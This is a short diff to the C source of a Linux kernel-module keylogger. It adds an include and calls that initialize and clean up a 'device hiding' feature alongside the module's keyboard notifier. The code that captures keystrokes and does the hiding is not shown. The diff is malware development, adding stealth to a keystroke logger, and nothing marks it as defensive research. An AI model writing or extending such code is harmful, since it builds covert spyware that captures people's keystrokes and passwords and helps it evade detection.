@@ -10,6 +10,7 @@
 #include "keylogger.h"
 #include "keymap.h"
 #include "ringbuf.h"
+#include "device.h"
 
 #define DEVICE_NAME "keylogger"
 #define CLASS_NAME "keylogger_class"
@@ -183,6 +184,10 @@ int keylogger_init(void)
     }
 
     printk(KERN_INFO "Keylogger: Successfully initialized (major: %d)\n", major_number);
+    
+    // Initialize device hiding
+    keylogger_device_init();
+    
     return 0;
 
 err_device:
@@ -204,6 +209,8 @@ void keylogger_exit(void)
 
     printk(KERN_INFO "Keylogger: Exiting...\n");
 
+    // Cleanup device hiding
+    keylogger_device_exit();
     
     unregister_keyboard_notifier(&keylogger_nb);
 
